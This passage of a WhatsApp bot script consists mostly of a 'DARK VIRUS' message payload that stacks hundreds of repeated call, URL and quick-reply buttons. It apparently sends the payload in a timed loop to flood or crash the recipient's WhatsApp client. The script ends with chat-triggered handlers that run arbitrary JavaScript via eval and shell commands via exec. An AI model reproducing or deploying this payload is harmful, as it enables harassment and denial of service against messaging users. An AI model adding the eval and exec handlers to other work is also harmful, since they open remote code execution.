{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
   { callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
 { callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
 { callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
  { callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
   { callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
 { callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
 { callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quoted: lep }
]})}
        txts = `DONE â`
        diablobotwhatsapp.reply(txts)
await sleep(ms(waktu))
break
default:
}
if (budy.startsWith('=>')) {
if (!itsMediablo) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return diablobotwhatsapp.reply(bang)
}
try {
diablobotwhatsapp.reply(util.format(eval(`(async () => { ${budy.slice(3)} })()`)))
} catch (e) {
diablobotwhatsapp.reply(String(e))
}
}
if (budy.startsWith('>')) {
if (!itsMediablo) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await diablobotwhatsapp.reply(evaled)
} catch (err) {
diablobotwhatsapp.reply(String(err))
}
}
if (budy.startsWith('<')) {
if (!itsMediablo) return
try {
return diablobotwhatsapp.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}
if (budy.startsWith('$')){
if (!itsMediablo) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return diablobotwhatsapp.reply(`${err}`)
if (stdout) {
diablobotwhatsapp.reply(stdout)
}
})
}
} catch (err) {
diablobotwhatsapp.reply(util.format(err))
}
} 